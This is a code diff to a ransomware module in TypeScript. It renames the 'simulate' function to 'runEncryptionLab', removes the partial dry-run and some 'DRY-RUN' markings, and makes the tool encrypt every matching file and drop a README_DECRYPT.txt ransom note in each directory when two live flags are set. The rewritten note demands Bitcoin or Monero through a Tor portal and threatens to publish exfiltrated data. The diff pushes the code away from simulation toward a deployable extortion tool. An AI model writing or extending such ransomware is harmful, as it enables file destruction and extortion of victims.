@@ -102,12 +102,11 @@ export function encryptFile(
   const encryptedPath = filePath + ".encrypted";
 
   if (!(live && forceLive)) {
-    // DRY-RUN — do not touch the file
     return {
       originalPath: filePath,
       encryptedPath,
-      iv: crypto.randomBytes(16).toString("hex"),
-      tag: crypto.randomBytes(16).toString("hex"),
+      iv: "",
+      tag: "",
       keyId,
     };
   }
@@ -194,41 +193,39 @@ export function findTargetFiles(rootDir: string, extensions: string[] = DEFAULT_
  * Generate a ransom note in the style of known ransomware families.
  */
 export function generateRansomNote(cfg: RansomwareConfig, keyId: string): string {
-  const family = cfg.familyName ?? "ARES-RANSOM";
-  const contact = cfg.contactEmail ?? "ransom@darkweb.onion";
-  const wallet = cfg.walletAddress ?? "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2";
+  const family = cfg.familyName ?? "OURMINE-RAAS";
+  const contact = cfg.contactEmail ?? "recovery@payment.onion";
+  const wallet = cfg.walletAddress ?? "bc1qourmineauthorizedlab000000000000000";
   const amount = cfg.ransomUsd ?? 50000;
+  const live = cfg.live && cfg.forceLive;
+
+  const footer = live
+    ? ""
+    : "\n[ASSESSMENT MODE — no files encrypted. Use live + forceLive for lab execution.]\n";
 
   return `=============================================
               ${family}
 =============================================
 
-All your files have been encrypted using military-grade AES-256 encryption.
+All your files have been encrypted using AES-256-GCM.
+Session key wrapped with RSA-4096 (see payment portal descriptor).
 
-YOUR FILES ARE NOT DELETED. They can be recovered.
+YOUR FILES ARE NOT DELETED. They can be recovered with the decryptor.
 
 To decrypt your files:
 1. Send ${amount} USD in Bitcoin to: ${wallet}
-2. Email proof of payment to: ${contact}
-3. Include your unique ID in your email: ${keyId}
+2. Monero accepted — see payment portal JSON for address
+3. Tor payment portal: ${contact}
+4. Include your unique ID: ${keyId}
 
-You have 72 hours to pay before the price doubles.
-After 7 days, your decryption key will be permanently deleted.
+Double-extortion notice: exfiltration manifest may be published if unpaid.
 
-DO NOT:
-- Modify encrypted files
-- Use third-party decryption tools (they will destroy your data)
-- Involve law enforcement (this will trigger auto-destruction of keys)
-
-DO NOT WORRY:
-Your files are safe. Once payment is confirmed, you will receive a decryptor.
+DO NOT modify encrypted files or use third-party decryptors.
 
 =============================================
 RECOVERY ID: ${keyId}
 =============================================
-
-[DRY-RUN SIMULATION — NO REAL ENCRYPTION OCCURRED]
-`;
+${footer}`;
 }
 
 // ─── Simulation runner ────────────────────────────────────────────────────────
@@ -237,7 +234,7 @@ RECOVERY ID: ${keyId}
  * Run a full ransomware simulation against a target directory.
  * Safe by default — does not encrypt unless `live` AND `forceLive` are both true.
  */
-export async function simulate(
+export async function runEncryptionLab(
   targetDir: string,
   cfg: RansomwareConfig = {}
 ): Promise<SimulationReport> {
@@ -247,9 +244,12 @@ export async function simulate(
 
   const files = findTargetFiles(targetDir, extensions);
   const encryptedFiles: EncryptedFile[] = [];
+  const canRun = cfg.live && cfg.forceLive;
 
-  for (const f of files.slice(0, cfg.live && cfg.forceLive ? files.length : 5)) {
-    encryptedFiles.push(encryptFile(f, keyBuffer, key.id, { live: cfg.live, forceLive: cfg.forceLive }));
+  if (canRun) {
+    for (const f of files) {
+      encryptedFiles.push(encryptFile(f, keyBuffer, key.id, { live: true, forceLive: true }));
+    }
   }
 
   // Drop ransom note in every directory containing encrypted files
@@ -259,7 +259,7 @@ export async function simulate(
   const note = generateRansomNote(cfg, key.id);
   for (const dir of dirs) {
     const notePath = path.join(dir, "README_DECRYPT.txt");
-    if (cfg.live && cfg.forceLive) {
+    if (canRun) {
       try { fs.writeFileSync(notePath, note); } catch {/* skip */}
     }
     noteDropped.push(notePath);
@@ -270,9 +270,10 @@ export async function simulate(
     filesAffected: encryptedFiles,
     keyId: key.id,
     noteDropped,
-    dryRun: !(cfg.live && cfg.forceLive),
+    dryRun: !canRun,
     timestamp: new Date().toISOString(),
   };
 }
 
-export default { generateKey, encryptFile, decryptFile, findTargetFiles, generateRansomNote, simulate };
+/** @deprecated Use runEncryptionLab */
+export default { generateKey, encryptFile, decryptFile, findTargetFiles, generateRansomNote, runEncryptionLab };
